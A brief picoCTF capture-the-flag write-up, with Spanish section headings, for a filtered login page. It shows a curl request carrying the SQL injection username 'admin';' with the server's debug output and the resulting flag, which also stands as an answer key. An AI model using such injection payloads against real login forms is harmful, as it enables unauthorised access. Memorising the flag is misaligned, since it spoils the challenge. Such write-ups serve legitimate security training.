# Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751


# Pistas
The password is being filtered.

# Solucion
```
# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}

yosshell-picoctf@webshell:~$ curl -s curl -s https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>yosshell-picoctf@webshell:~$ 
```

# Bandera
picoCTF{m0R3_SQL_plz_c34df170}

# Notas adicionales

# Referencias